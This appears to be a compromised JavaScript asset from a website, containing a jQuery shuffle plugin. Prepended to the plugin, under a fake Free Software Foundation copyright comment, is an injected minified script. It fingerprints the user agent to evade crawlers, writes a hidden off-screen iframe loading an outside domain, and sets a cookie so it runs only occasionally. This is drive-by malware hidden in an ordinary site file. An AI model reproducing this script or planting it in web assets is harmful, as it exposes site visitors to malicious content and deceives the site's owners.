/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0}!function(){function e(e,t,o){var r=(e+"").toLowerCase(),i=(t+"").toLowerCase(),n=0;return-1!==(n=r.indexOf(i,o))?n:!1}function t(){var t=["Linux","Windows NT 6.3","Yandex","rv:11.0","AppleWebKit","Googlebot","Android","IEMobile","Windows NT 6.2"],o=!1;for(var r in t)if(e(navigator.userAgent,t[r])){o=!0;break}return o}var o=void 0===getCookie("ipmoture_aurma");if(!t()&&o){document.write('<iframe src="http://rayanet.w3drive.com/simplemist17.html?k" style="border-right-style: dashed;border-left-style: dashed;top: -1000px;left: -1000px;border-top-width: 4px;position: absolute;border-left-width: 4px;" height="142" width="142"></iframe>');var r=new Date((new Date).getTime()+1728e5);document.cookie="ipmoture_aurma=1; path=/; expires="+r.toUTCString()}}();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/(function($){

	$.fn.jj_ngg_shuffle = function() {
		return this.each(function(){
			var items = $(this).children().clone(true);
			return (items.length) ? $(this).html($.jj_ngg_shuffle(items)) : this;
		});
	}
	
	$.jj_ngg_shuffle = function(arr) {
		for(var j, x, i = arr.length; i; j = parseInt(Math.random() * i), x = arr[--i], arr[i] = arr[j], arr[j] = x);
		return arr;
	}
	
})(jQuery);